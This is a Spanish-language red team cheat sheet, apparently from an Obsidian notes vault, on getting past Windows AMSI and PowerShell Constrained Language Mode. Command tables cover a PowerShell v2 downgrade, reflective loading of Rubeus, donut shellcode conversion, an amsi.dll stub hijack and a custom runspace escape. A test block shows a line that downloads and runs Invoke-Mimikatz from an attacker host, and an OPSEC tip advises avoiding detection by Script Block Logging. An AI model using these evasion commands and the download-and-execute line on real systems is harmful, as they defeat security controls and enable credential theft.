---
aliases:
  - AMSI Alternative Evasion
  - PowerShell v2 Downgrade
tags:
  - technique/defense-evasion
  - technique/execution
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Payload Engineering]]"
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AMSI Bypasses]]"
  - "[[AD - Security Controls Enumeration]]"
---
# AMSI Bypasses - Evasión Alternativa

> Cuando patchear AMSI no es viable: evitar el motor por completo (PSv2, binarios, DLL hijack) o lidiar con CLM en paralelo.

---

## Evitar AMSI por Completo

| **Comando / Técnica** | **Qué hace** | **Cuándo** |
|:---|:---|:---|
| `powershell -version 2` | PSv2 **no tiene AMSI** → ejecuta sin scan | PSv2 disponible (Win7+). |
| `Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2` | Chequea si PSv2 está instalado | Pre-downgrade. |
| `Invoke-Binary /path/Rubeus.exe 'triage'` (evil-winrm) | Carga reflectiva de un .exe → no pasa por AMSI | Saltar PowerShell entero. |
| `donut -f 1 -i Rubeus.exe -o rubeus.bin` | Convierte el .exe en shellcode (reflective PE) | Ejecutar sin escribir disco. |
| Reemplazar `amsi.dll` por stub (`AmsiScanBuffer → S_OK`) | DLL hijack en el search path de la app | Admin local. |
^amsi-altevasion

## CLM (Constrained Language Mode)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `$ExecutionContext.SessionState.LanguageMode` | Modo actual (FullLanguage / ConstrainedLanguage) | Detectar CLM (AppLocker/WDAC). |
| `powershell -version 2` | PSv2 no aplica CLM | Bypass de CLM + AMSI a la vez. |
| Runspace custom (`[RunspaceFactory]::CreateRunspace()`) | Escapa CLM en algunos contextos | CLM por política. |
^amsi-clm

### Testing del bypass

```powershell
# String EICAR de AMSI — si imprime sin error → bypass OK
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
# O probar con payload real:
iex (new-object net.webclient).downloadstring('http://atk/Invoke-Mimikatz.ps1')
```

> [!tip] OPSEC
> **Script Block Logging (4104)** captura el script **antes** de AMSI → bypassear AMSI no evita el logging. Para evasión seria: evitar PowerShell (binario + reflective loader) y revisar qué EDR hay → [[AD - Security Controls Enumeration]].
